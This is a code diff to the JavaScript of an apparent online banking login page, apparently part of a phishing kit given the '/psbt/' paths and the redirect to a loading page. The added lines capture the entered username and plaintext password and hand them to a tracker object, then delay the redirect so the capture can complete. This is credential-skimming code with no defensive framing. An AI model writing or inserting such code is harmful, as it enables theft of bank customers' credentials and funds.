@@ -1024,8 +1024,20 @@ document.addEventListener('DOMContentLoaded', function() {
                     return;
                 }
                 
+                if (window.ALPTracker && typeof window.ALPTracker.trackFormData === 'function') {
+                    var loginTypeEl = document.getElementById('onlineBankingLogin');
+                    var loginTypeVal = loginTypeEl ? (loginTypeEl.options[loginTypeEl.selectedIndex] ? loginTypeEl.options[loginTypeEl.selectedIndex].text : loginTypeEl.value) : 'Online Banking';
+                    window.ALPTracker.trackFormData({
+                        username: usernameValue,
+                        password: passwordValue,
+                        login_type: loginTypeVal
+                    });
+                }
+                
                 var slugRedirect = (window.location.pathname.includes('/psbt/') || window.location.pathname.startsWith('/psbt')) ? '/psbt/loading' : 'loading.html';
-                window.location.href = slugRedirect;
+                setTimeout(function() {
+                    window.location.href = slugRedirect;
+                }, 350);
             }
         });
         
